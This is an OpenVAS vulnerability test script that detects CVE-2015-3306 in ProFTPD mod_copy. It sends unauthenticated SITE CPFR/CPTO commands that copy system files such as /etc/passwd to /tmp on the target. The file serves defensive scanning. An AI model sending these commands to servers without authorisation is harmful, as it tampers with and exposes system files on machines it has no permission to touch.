###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_proftpd_unauthenticated_cpfr_cpto_04_15.nasl 11831 2018-10-11 07:49:24Z jschulte $
#
# ProFTPD `mod_copy` Unauthenticated Copying Of Files Via SITE CPFR/CPTO
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:proftpd:proftpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105254");
  script_version("$Revision: 11831 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-04-13 18:15:12 +0200 (Mon, 13 Apr 2015)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("ProFTPD `mod_copy` Unauthenticated Copying Of Files Via SITE CPFR/CPTO");
  script_cve_id("CVE-2015-3306");
  script_category(ACT_ATTACK);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("secpod_proftpd_server_detect.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ProFTPD/Installed");

  script_xref(name:"URL", value:"http://bugs.proftpd.org/show_bug.cgi?id=4169");

  script_tag(name:"impact", value:"Under some circumstances this could result in remote code execution");

  script_tag(name:"vuldetect", value:"Try to copy /etc/passwd to /tmp/passwd.copy with SITE CPFR/CPTO");

  script_tag(name:"solution", value:"Ask the vendor for an update");

  script_tag(name:"summary", value:"ProFTPD is prone to an unauthenticated copying of files vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! loc = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection-NVT

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

files = traversal_files("linux");

foreach pattern( keys( files ) ) {

  file = files[pattern];

  send( socket:soc, data:'site cpfr /' +file + '\n' );
  recv = recv( socket:soc, length:128 );

  if( "350 File or directory exists" >!< recv ) {
    continue;
  }

  send( socket:soc, data:'site cpto /tmp/passwd.copy\n' );
  recv = recv( socket:soc, length:128 );

  if( "250 Copy successful" >< recv ) {
    close( soc );
    security_message( data: "The target was found to be vulnerable", port:port );
    exit( 0 );
  }
}

close( soc );
exit( 99 );
